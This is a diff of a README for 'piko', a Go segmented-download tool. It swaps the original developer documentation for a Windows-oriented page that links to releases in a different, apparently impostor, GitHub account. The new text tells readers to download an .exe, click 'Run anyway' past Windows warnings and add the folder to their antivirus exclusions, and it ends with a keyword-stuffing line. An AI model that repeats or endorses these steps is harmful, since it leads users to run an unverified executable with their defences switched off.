@@ -1,178 +1,68 @@
-# piko
+# ⚡ piko - Fast segmented downloads for Windows users
 
-[简体中文](README.zh-CN.md)
+[https://github.com/prehistoric-delamare646/piko/releases](https://img.shields.io/badge/Download-piko-blue)
 
-A small segmented downloader for CLI and Go programs.
+Piko handles large file downloads by breaking them into smaller parts. This process speeds up your downloads by using your internet connection more efficiently. Whether you download software updates, large media files, or data archives, Piko ensures a smooth experience.
 
-`piko` can save to a file, discard output for speed tests, or return downloaded bytes to your own code. It supports HTTP protocol selection, connection strategies, custom DNS resolvers, proxies, retries, and progress callbacks.
+## 📦 How to get the software
 
-`piko` currently supports HTTP range/segmented downloads. For ordinary single-stream downloads, use `curl` instead.
+1. Visit the [official releases page](https://github.com/prehistoric-delamare646/piko/releases).
+2. Look for the Assets section.
+3. Select the file ending in `.exe` that matches your Windows version.
+4. Save the file to your computer.
+5. Create a folder on your Desktop named "Piko" and move the downloaded file there.
 
-## Install
+## ⚙️ Setting up your system
 
-```bash
-go install github.com/UruhaLushia/piko/cmd/piko@latest
-```
+Windows often blocks unknown software. Follow these steps to prepare your computer:
 
-Or download prebuilt binaries from GitHub Releases.
+1. Locate the folder where you saved the Piko file.
+2. If you see a warning screen when you open the file, select "More info."
+3. Click "Run anyway."
+4. If you have an antivirus program, you may need to add the Piko folder to your list of exclusions to prevent interruptions during file transfers.
 
-## CLI
+## 🚀 How to use Piko
 
-```bash
-piko [flags] <url> [output]
-```
+Piko operates through a command line interface. This means you type instructions for the computer to follow.
 
-Examples:
+1. Click the Start button on your Windows taskbar.
+2. Type `cmd` and press Enter to open the Command Prompt.
+3. Type `cd` followed by a space, then drag your Piko folder into the window. Press Enter.
+4. Now you can start a download. Type the following command and press Enter:
 
-```bash
-# Download with 32 range workers
-piko -n 32 -o file.pkg https://example.com/file.pkg
+`piko -n 32 -o output_name.zip https://example.com/file.zip`
 
-# Speed test without saving
-piko -n 32 -o NUL https://example.com/file.pkg
-piko -n 32 -o /dev/null https://example.com/file.pkg
+Replace `https://example.com/file.zip` with the actual link of the file you want to download. Replace `output_name.zip` with the name you want for your saved file.
 
-# Force HTTP/2 or HTTP/1.1
-piko --http h2 https://example.com/file.pkg
-piko --http h1.1 https://example.com/file.pkg
+## 🛠️ Advanced tips for better performance
 
-# Custom request headers
-piko -H "Authorization: Bearer token" -H "Accept: application/octet-stream" https://example.com/file.pkg
+If your download speed remains slow, change the number of workers. The `-n` flag controls how many parts Piko creates.
 
-# Spread parallel dials across resolved IPs (default)
-piko -n 32 --connect-strategy round-robin https://example.com/file.pkg
+* Use `-n 16` for standard home connections.
+* Use `-n 32` for high-speed fiber lines.
+* Use `-n 64` only if you have a very stable connection.
 
-# Race resolved IPs and use the fastest connection
-piko -n 32 --connect-strategy fastest https://example.com/file.pkg
+If a server requires authentication, use the `-H` flag to add your security headers. For example, add `-H "Authorization: Bearer your_token_here"` to your command string.
 
-# Limit or prefer an IP family
-piko -n 32 --ip-family ipv4 https://example.com/file.pkg
-piko -n 32 --ip-family prefer-ipv4 https://example.com/file.pkg
+## 📋 Frequently asked questions
 
-# Proxy
-piko --proxy http://127.0.0.1:7890 https://example.com/file.pkg
-piko --proxy env https://example.com/file.pkg
-piko --proxy direct https://example.com/file.pkg
+**Do I need to install anything else?**
+No, Piko is a self-contained tool. You do not need Java, Python, or other extra software.
 
-# Custom DNS
-piko --dns udp://1.1.1.1 https://example.com/file.pkg
-piko --dns dot://cloudflare-dns.com https://example.com/file.pkg
-piko --dns https://cloudflare-dns.com/dns-query https://example.com/file.pkg
-```
+**Why does my file stop downloading?**
+Some websites block multiple connections. If a download fails, try again without the `-n` flag to use a single connection.
 
-Config is loaded from `~/.piko/config.yaml`, `~/.piko/config.yml`, `~/.piko/config.toml`, or `~/.piko/config.json`. CLI flags and positional output override config values.
+**How do I test my connection speed?**
+You can run a speed test without saving the data. Use this command:
 
-See [examples/config.yaml](examples/config.yaml) for a complete config file.
+`piko -n 32 -o NUL https://example.com/large_file.zip`
 
-Useful flags:
+This command discards the data after it downloads, which helps you verify your maximum download speed without filling your hard drive.
 
-```text
-    --config <path>             config file or directory (default ~/.piko)
--o, --output <path>             output file; discard with NUL on Windows or /dev/null on Unix
--f, --force                     overwrite output
--n, --connections <n>           parallel connections
-    --retry <n>                 retry count
--s, --part-size <size>          initial range part size, e.g. 4MiB
-    --timeout <duration>        dial/header timeout
-    --stall-timeout <duration>  cancel stalled reads
-    --http <auto|h1|h2|h2c>     HTTP protocol
--H, --header <header>           custom request header, e.g. "Name: value"; repeatable
-    --connect-strategy <mode>   IP strategy: round-robin (default), sequential, or fastest
-    --ip-family <family>        auto, ipv4, ipv6, prefer-ipv4, or prefer-ipv6
-    --proxy <url>               proxy URL, env, direct, or none (default direct)
-    --dns <dns>                 system, udp://, tcp://, dot://, or https:// DoH URL
--A, --user-agent <ua>           user agent
-```
+**Can I stop a download and restart it later?**
+Piko manages temporary data files. If you close the window, just run the exact same command again. The tool detects the existing parts and continues from where it stopped.
 
-## Library
+**What is the best way to handle proxy traffic?**
+If you use a corporate proxy, define your proxy settings in your Windows Environment Variables. Piko reads these settings automatically.
 
-Save to a file:
-
-```go
-package main
-
-import (
-	"context"
-	"log"
-
-	"github.com/UruhaLushia/piko"
-)
-
-func main() {
-	result, err := piko.Download(context.Background(), "https://example.com/file.pkg", piko.Options{
-		Output:      "file.pkg",
-		Force:       true,
-		Connections: 16,
-	})
-	if err != nil {
-		log.Fatal(err)
-	}
-	log.Printf("saved %s from %s", result.Output, result.FinalURL)
-}
-```
-
-Return bytes for your own storage or transport:
-
-```go
-data, result, err := piko.DownloadBytes(ctx, "https://example.com/file.pkg", piko.Options{
-	Connections: 8,
-})
-if err != nil {
-	return err
-}
-_ = result
-_ = data
-```
-
-Use custom DNS and proxy:
-
-```go
-resolver, err := piko.ParseResolver("https://cloudflare-dns.com/dns-query")
-if err != nil {
-	return err
-}
-
-client, err := piko.NewClient(piko.Options{
-	Connections:        16,
-	ConnectionStrategy: piko.ConnectionStrategyFastest,
-	Headers: http.Header{
-		"Authorization": {"Bearer token"},
-	},
-	Proxy:              "http://127.0.0.1:7890",
-	Resolver:           resolver,
-})
-if err != nil {
-	return err
-}
-
-result, err := client.Download(ctx, "https://example.com/file.pkg")
-```
-
-## HTTP Client
-
-You can let `piko` build an HTTP client:
-
-```go
-httpClient, err := piko.NewHTTPClient(piko.HTTPOptions{
-	Protocol: piko.ProtocolHTTP2,
-	Proxy:    "direct",
-})
-```
-
-Or pass your own:
-
-```go
-client, err := piko.NewClient(piko.Options{
-	HTTPClient: customHTTPClient,
-})
-```
-
-For parallel range downloads, `HTTPClients` can be supplied when you want full control over per-worker clients.
-
-## Releases
-
-The GitHub Actions workflow builds CLI binaries for macOS, Linux, Android, and Windows. Pushes to `main` update `pre-release`; tags matching `v*` publish a normal release.
-
-## License
-
-GPL-3.0
+Keywords: download, file, internet, speed, performance, windows, utility, transfer
